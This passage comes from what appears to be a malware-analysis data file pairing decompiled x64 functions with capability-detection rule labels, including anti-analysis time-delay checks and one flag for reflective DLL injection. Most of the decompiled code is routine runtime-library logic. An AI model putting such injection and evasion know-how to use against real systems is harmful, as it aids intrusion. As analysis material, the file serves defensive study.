0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x5b;\n            uVar3 = 0x5b;\n        }\n        *(arg1 + 0x108) = uVar3;\n        fcn.14000b4c0(arg1, 0x11, arg3_00);\n        cVar4 = pcVar2[1];\n        if (cVar4 == 'X') {\n            puVar7 = 0x1400ffa12;\n            iVar5 = *(arg1 + 0x100);\n            do {\n                uVar3 = *puVar7;\n                if (iVar5 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar6 = 1;\n                    iVar5 = 0;\n                }\n                else {\n                    iVar6 = iVar5 + 1;\n                }\n                puVar7 = puVar7 + 1;\n                *(arg1 + 0x100) = iVar6;\n                *(arg1 + iVar5) = uVar3;\n                *(arg1 + 0x108) = uVar3;\n                iVar5 = iVar6;\n            } while (puVar7 != 0x1400ffa17);\n            fcn.14000b4c0(arg1, 0x11, *(arg3_01 + 4));\n            arg3_01 = *(arg3_01 + 6);\n            cVar4 = pcVar2[1];\n        }\n        if (cVar4 != 'i') {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x5d;\n            *(arg1 + 0x108) = 0x5d;\n        }\n        if ((((*arg3_01 & 0xfffffffd) == 0x38) && (***(*(arg3_01 + 4) + 0x10) == 'd')) &&\n           ((uVar1 = (**(*(arg3_01 + 4) + 0x10))[1],  (uVar1 & 0xdf) == 0x58 || (uVar1 == 0x69)))) {\n            fcn.14000b4c0(arg1, 0x11, arg3_01);\n        }\n        else {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x3d;\n            *(arg1 + 0x108) = 0x3d;\n            fcn.14000ce50(arg1, 0x11, arg3_01);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1385
    },
    "14000e88": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14000e880(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "1400120c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400120c0(int64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar auStack88 [24];\n    \n    fcn.140018070(auStack88, 0);\n    iVar1 = *(arg3 + 2);\n    iVar2 = iVar1;\n    if (arg2 <= iVar1) {\n        iVar2 = arg2;\n    }\n    if (-1 < iVar1) {\n        arg2._0_4_ = iVar2;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar1 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar1;\n        if ((*(arg3 + 9) & 4) == 0) {\n            *(arg3 + 0xc) = iVar1 + -1;\n            do {\n                fcn.140012060(0x20, arg3);\n                iVar1 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar1 + -1;\n            } while (iVar1 != 0);\n            if (arg2 < 1) goto code_r0x0001400121cd;\n        }\n        else if (arg2 < 1) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x0001400121c0;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 < 1) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar3 = 0;\n    do {\n        iVar1 = fcn.140018070(auStack88, *(arg1 + iVar3 * 2));\n        if (iVar1 < 1) goto code_r0x0001400121cd;\n        puVar4 = auStack88;\n        do {\n            while( true ) {\n                puVar5 = puVar4 + 1;\n                if (((*(arg3 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) break;\ncode_r0x00014001215a:\n                *(arg3 + 0x24) = iVar2 + 1;\n                puVar4 = puVar5;\n                if (puVar5 == auStack88 + (iVar1 - 1) + 1) goto code_r0x00014001219c;\n            }\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n                goto code_r0x00014001215a;\n            }\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            puVar4 = puVar5;\n        } while (puVar5 != auStack88 + (iVar1 - 1) + 1);\ncode_r0x00014001219c:\n        iVar3 = iVar3 + 1;\n    } while (0 < arg2 - iVar3);\n    iVar1 = *(arg3 + 0xc);\n    *(arg3 + 0xc) = iVar1 + -1;\n    if (iVar1 < 1) {\n        return;\n    }\ncode_r0x0001400121c0:\n    do {\n        fcn.140012060(0x20, arg3);\ncode_r0x0001400121cd:\n        iVar1 = *(arg3 + 0xc);\n        *(arg3 + 0xc) = iVar1 + -1;\n    } while (0 < iVar1);\n    return;\n}\n",
        "token_count": 908
    },
    "14001225": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140012250(uchar *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar1 = *(arg3 + 2);\n    uVar3 = uVar1;\n    if (arg2 <= uVar1) {\n        uVar3 = arg2;\n    }\n    if (-1 < uVar1) {\n        arg2._0_4_ = uVar3;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar2 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar2;\n        uVar1 = *(arg3 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg3 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140012060(0x20, arg3);\n                iVar2 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (arg2 == 0) goto code_r0x0001400122f1;\n            goto code_r0x00014001228e;\n        }\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x000140012301;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x00014001228e:\n        uVar1 = *(arg3 + 1);\n    }\n    puVar4 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n        if (puVar4 + 1 == arg1 + arg2) break;\n        uVar1 = *(arg3 + 1);\n        puVar4 = puVar4 + 1;\n    }\ncode_r0x0001400122f1:\n    while (iVar2 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg3 + 1);\ncode_r0x000140012301:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "14001454": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.140014540(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (0x1b < arg1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            uVar3 = uVar3 + 1;\n        } while (iVar1 + 0x17 < arg1);\n    }\n    puVar2 = fcn.140016f80(uVar3);\n    *puVar2 = uVar3;\n    return puVar2 + 1;\n}\n",
        "token_count": 147
    },
    "140017e1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140017e10(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.140017fc0(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.140017fc0(0x13);\n        if (arg1 <= uVar1) {\n            iVar2 = fcn.140017fc0(0);\n            sub.msvcrt.dll__lock((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            *(arg1 + 0x18) = *(arg1 + 0x18) | 0x8000;\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x000140017e3c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 225
    },
    "140017e8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140017e80(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.140017fc0(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.140017fc0(0x13);\n        if (arg1 <= uVar1) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) & 0xffff7fff;\n            iVar2 = fcn.140017fc0(0);\n    // WARNING: Could not recover jumptable at 0x000140018578. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll__unlock)((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x000140017eac. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 262
    },
    "14001970": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.140019700(ulong arg1, int64_t arg2)\n\n{\n    if (arg1 == 0xff) {\n        return 0;\n    }\n    arg1._0_1_ = arg1 & 0x70;\n    if (arg1 != 0x30) {\n        if (arg1 < 0x31) {\n            if (arg1 == 0x20) {\n                return *(*(arg2 + 0x20) + 8);\n            }\n            if (arg1 < 0x21) {\n                return 0;\n            }\n        }\n        else {\n            if (arg1 == 0x40) {\n                return **(*(arg2 + 0x20) + 0x10) + *(*(arg2 + 0x20) + 8);\n            }\n            if (arg1 == 0x50) {\n                return 0;\n            }\n        }\n        sub.msvcrt.dll_abort();\n    }\n    return 0;\n}\n",
        "token_count": 219
    },
    "1400b692": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400b6920(int64_t arg1)\n\n{\n    uint64_t arg1_00;\n    \n    arg1_00 = arg1 - 0xa0;\n    if ((*0x1400f9b78 < arg1_00) && (arg1_00 < *0x1400f9b78 + *0x1400f9b80)) {\n        fcn.14001a1b0(arg1_00);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_free)();\n    return;\n}\n",
        "token_count": 157
    },
    "14001a31": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t * fcn.14001a310(uint64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint64_t **ppuVar6;\n    uint64_t uVar7;\n    \n    piVar1 = *0x140102a70;\n    iVar2 = **0x140102a70;\n    if (iVar2 != 0) goto code_r0x00014001a3d0;\n    puVar3 = arg1 + 2;\n    if (puVar3 < 0x10) {\n        puVar3 = 0x10;\n    }\n    if (*0x1400f9b70 == NULL) {\n        return NULL;\n    }\n    do {\n        uVar4 = puVar3 + 0xfU & 0xfffffffffffffff0;\n        ppuVar6 = 0x1400f9b70;\n        arg1 = *0x1400f9b70;\n        do {\n            if (uVar4 <= *arg1) {\n                uVar7 = *arg1 - uVar4;\n                if (uVar7 < 0x10) {\n                    *arg1 = *arg1;\n                    puVar3 = arg1[1];\n                }\n                else {\n                    puVar3 = arg1 + uVar4;\n                    puVar3[1] = arg1[1];\n                    arg1 = *ppuVar6;\n                    *puVar3 = uVar7;\n                    *arg1 = uVar4;\n                }\n                *ppuVar6 = puVar3;\n                arg1 = arg1 + 2;\n                break;\n            }\n            ppuVar6 = arg1 + 1;\n            arg1 = arg1[1];\n        } while (arg1 != NULL);\n        do {\n            if (iVar2 == 0) {\n                return arg1;\n            }\n            iVar2 = fcn.14000eab0(0x1400f9b60);\n            if (iVar2 == 0) {\n                return arg1;\n            }\n            fcn.14001bf30();\ncode_r0x00014001a3d0:\n            uVar5 = 0x400f9b60;\n            iVar2 = fcn.14000ea40(0x1400f9b60);\n            if (iVar2 != 0) {\n                fcn.14001bf00();\n                switch(uVar5 & 0x7d) {\n                default:\n                    return NULL;\n                case 1:\n                case 0x11:\n                    return 0x140100c18;\n                case 5:\n                case 0x15:\n                    return 0x140100c39;\n                case 8:\n                    return 0x140100c1e;\n                case 9:\n                case 0x19:\n                    return 0x140100c2a;\n                case 0xc:\n                    return 0x140100c15;\n                case 0xd:\n                case 0x1d:\n                    return 0x140100c1a;\n                case 0x10:\n                case 0x30:\n                    return 0x140100c10;\n                case 0x14:\n                case 0x34:\n                    return 0x140100c32;\n                case 0x18:\n                    return 0x140100c20;\n                case 0x1c:\n                    return 0x140100c3c;\n                case 0x38:\n                    return 0x140100c23;\n                case 0x3c:\n                    return 0x140100c40;\n                case 0x50:\n                case 0x70:\n                    return 0x140100c12;\n                case 0x54:\n                    return 0x140100c35;\n                case 0x78:\n                    return 0x140100c26;\n                case 0x7c:\n                    return \"w+bx\";\n                }\n            }\n            puVar3 = arg1 + 2;\n            iVar2 = *piVar1;\n            if (puVar3 < 0x10) {\n                puVar3 = 0x10;\n            }\n            arg1 = *0x1400f9b70;\n        } while (*0x1400f9b70 == NULL);\n    } while( true );\n}\n",
        "token_count": 969
    },
    "14002402": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140024020(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    bool bVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    bool bVar5;\n    \n    piVar1 = *arg1;\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    bVar2 = piVar1 != NULL && *(arg1 + 1) == -1;\n    bVar5 = *(arg1 + 1) == -1;\n    if (bVar2) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar4 = *piVar1[2];\n        }\n        else {\n            uVar4 = (**(*piVar1 + 0x48))();\n        }\n        bVar5 = false;\n        if (uVar4 == -1) {\n            *arg1 = NULL;\n            bVar5 = bVar2;\n        }\n    }\n    piVar1 = *arg2;\n    uVar4 = uVar4 & 0xffffffffffffff00;\n    bVar3 = piVar1 != NULL && *(arg2 + 1) == -1;\n    bVar2 = *(arg2 + 1) == -1;\n    if (bVar3) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar4 = *piVar1[2];\n        }\n        else {\n            uVar4 = (**(*piVar1 + 0x48))();\n        }\n        bVar2 = false;\n        if (uVar4 == -1) {\n            *arg2 = NULL;\n            bVar2 = bVar3;\n        }\n    }\n    return uVar4 & 0xffffffffffffff00 | bVar5 == bVar2;\n}\n",
        "token_count": 412
    },
    "1400240d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400240d0(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    \n    piVar1 = *arg1;\n    if ((*(arg1 + 1) == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            iVar2 = *piVar1[2];\n        }\n        else {\n            iVar2 = (**(*piVar1 + 0x48))();\n        }\n        if (iVar2 == -1) {\n            *arg1 = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "140025b1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140025b10(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    \n    fcn.140025400(arg1);\n    if (*(*arg1 + 0x30) == 0x140025bf0) {\n        return arg2;\n    }\n    // WARNING: Could not recover jumptable at 0x000140025b4e. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*arg1 + 0x30))(arg1, arg2);\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "140029e1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140029e10(ulong *arg1, ulong s)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = arg1[1];\n    uVar1 = sub.msvcrt.dll_strlen(s);\n    uVar2 = uVar3;\n    if (uVar1 <= uVar3) {\n        uVar2 = uVar1;\n    }\n    if ((uVar2 != 0) && (uVar2 = sub.msvcrt.dll_memcmp(*arg1, s),  uVar2 != 0)) {\n        return uVar2;\n    }\n    uVar3 = uVar3 - uVar1;\n    uVar2 = 0x7fffffff;\n    if ((uVar3 < 0x80000000) && (uVar2 = 0x80000000,  -0x80000001 < uVar3)) {\n        uVar2 = uVar3 & 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 233
    },
    "14006c35": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14006c350(int64_t arg1, int64_t s2)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = 1;\n    if (s2 != arg1) {\n        uVar1 = 0;\n        if (**(arg1 + 8) != '*') {\n            uVar1 = sub.msvcrt.dll_strcmp(*(arg1 + 8), *(s2 + 8) + (**(s2 + 8) == '*'));\n            uVar1 = uVar1 & 0xffffffffffffff00 | uVar1 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "14006e36": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14006e360(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    iVar4 = *arg1;\n    if (*(iVar4 + -0x10) <= *(iVar4 + -0x18)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar3 = fcn.14006cbb0(iVar4 + -0x18, auStack25, 0);\n    iVar4 = *arg1;\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400b64d0(iVar4 + -0x18);\n    }\n    *arg1 = iVar3;\n    return;\n}\n",
        "token_count": 318
    },
    "14006e72": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14006e720(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\n    arg2_00 = iVar2 + 1;\n    if (arg2_00 <= *(iVar1 + -0x10)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar1 + -8) < 1) goto code_r0x00014006e765;\n        }\n        else if (*(iVar1 + -8) < 1) {\n            iVar1 = *arg1;\n            iVar2 = *(iVar1 + -0x18);\n            goto code_r0x00014006e765;\n        }\n    }\n    fcn.14006e440(arg1, arg2_00);\n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\ncode_r0x00014006e765:\n    *(iVar1 + iVar2 * 2) = arg2;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00 * 2) = 0;\n    return;\n}\n",
        "token_count": 299
    },
    "140076a5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.140076a50(int64_t *arg1, int64_t *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    piVar1 = *0x140102a70;\n    iVar4 = *arg2;\n    if (*arg1 != iVar4) {\n        if (*(iVar4 + -8) < 0) {\n            iVar4 = fcn.1400760a0(iVar4 + -0x18, auStack25, 0);\n            iVar3 = *arg1;\n            iVar2 = **0x140102a70;\n        }\n        else {\n            if (**0x140102a70 == 0) {\n                *(iVar4 + -8) = *(iVar4 + -8) + 1;\n            }\n            else {\n                LOCK();\n                *(iVar4 + -8) = *(iVar4 + -8) + 1;\n            }\n            iVar2 = *piVar1;\n            iVar3 = *arg1;\n        }\n        if (iVar2 == 0) {\n            iVar2 = *(iVar3 + -8);\n            *(iVar3 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iVar3 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.1400b64d0(iVar3 + -0x18);\n        }\n        *arg1 = iVar4;\n        return arg1;\n    }\n    return arg1;\n}\n",
        "token_count": 379
    },
    "14007773": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140077730(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    iVar4 = *arg1;\n    if (*(iVar4 + -0x10) <= *(iVar4 + -0x18)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar3 = fcn.1400760a0(iVar4 + -0x18, auStack25, 0);\n    iVar4 = *arg1;\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400b64d0(iVar4 + -0x18);\n    }\n    *arg1 = iVar3;\n    return;\n}\n",
        "token_count": 317
    },
    "140077ac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140077ac0(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\n    arg2_00 = iVar2 + 1;\n    if (arg2_00 <= *(iVar1 + -0x10)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar1 + -8) < 1) goto code_r0x000140077b05;\n        }\n        else if (*(iVar1 + -8) < 1) {\n            iVar1 = *arg1;\n            iVar2 = *(iVar1 + -0x18);\n            goto code_r0x000140077b05;\n        }\n    }\n    fcn.140077810(arg1, arg2_00);\n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\ncode_r0x000140077b05:\n    *(iVar1 + iVar2) = arg2;\n    iVar1 = *arg1;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00) = 0;\n    return;\n}\n",
        "token_count": 300
    },
    "14007a2e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14007a2e0(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    iVar1 = arg1[4];\n    *arg1 = 0x14010a7d0;\n    iVar3 = fcn.14009f6b0();\n    if ((iVar1 != iVar3) && (iVar1 != 0)) {\n        fcn.1400b64c0(iVar1);\n    }\n    piVar2 = arg1[2];\n    if (piVar2 != NULL) {\n        if (*(*piVar2 + 8) == 0x140098d40) {\n            *piVar2 = 0x14010b430;\n            fcn.14009f7d0(piVar2);\n            fcn.1400b64d0(piVar2);\n        }\n        else {\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    fcn.14009f7a0(arg1 + 3);\n    return;\n}\n",
        "token_count": 240
    },
    "14007ab4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14007ab40(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    iVar1 = arg1[4];\n    *arg1 = 0x14010a7f0;\n    iVar3 = fcn.14009f6b0();\n    if ((iVar1 != iVar3) && (iVar1 != 0)) {\n        fcn.1400b64c0(iVar1);\n    }\n    piVar2 = arg1[2];\n    if (piVar2 != NULL) {\n        if (*(*piVar2 + 8) == 0x140098f10) {\n            *piVar2 = 0x14010b450;\n            fcn.14009f7d0(piVar2);\n            fcn.1400b64d0(piVar2);\n        }\n        else {\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    fcn.14009f7a0(arg1 + 3);\n    return;\n}\n",
        "token_count": 238
    },
    "1400817b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.1400817b0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x88) = 1;\n    *(arg3 + 0x49) = uVar1;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    (**(iVar3 + 0x20))(&puStack88, arg2);\n    iVar3 = iStack80;\n    iVar2 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar2, iVar3, 0);\n    *(iVar2 + iVar3) = 0;\n    *(arg3 + 0x18) = iVar3;\n    *(arg3 + 0x10) = iVar2;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar3 = iStack80;\n    iVar2 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar2, iVar3, 0);\n    *(iVar2 + iVar3) = 0;\n    *(arg3 + 0x28) = iVar2;\n    *(arg3 + 0x30) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, 